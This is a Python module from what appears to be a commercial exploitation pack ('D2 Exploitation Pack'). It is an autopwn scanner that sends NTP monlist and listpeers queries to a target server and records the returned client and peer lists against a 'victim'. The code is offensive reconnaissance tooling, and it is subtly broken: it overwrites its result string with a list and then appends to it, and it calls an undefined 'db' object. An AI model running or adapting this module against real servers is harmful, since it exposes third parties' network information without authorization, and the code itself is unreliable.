#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

import autopwn
import proto.ntp
import xmlrpclib

class run(autopwn.run):

  def exploit(self, target, port):
    result = ''
    self.log.info('NTP Server Scanner')
    sock = proto.ntp.create_socket()
    result = '\n'
    result += 'List of recent clients (monlist)\n'
    result += '--------------------------------\n'
    payload = proto.ntp.create_payload_monlist()
    if proto.ntp.send_payload(sock, payload, target, port):
      return
    result = proto.ntp.recv_data(sock, payload, target, port)
    for r in result:
     if r:
        result += '%s\n' % r
    result += '\nList of peers (listpeers)\n'
    result += '---------------------------\n'
    payload = proto.ntp.create_payload_listpeer()
    if proto.ntp.send_payload(sock, payload, target, port):
      return
    result = proto.ntp.recv_data(sock, payload, target, port)
    for r in result:
      if r:
        result += '%s\n' % r
    self.log.debug('%s' % result)
    db.db_unique_info(self.victim, self.service, 'NTP Server Scanner', 'autopwn_ntp', result)
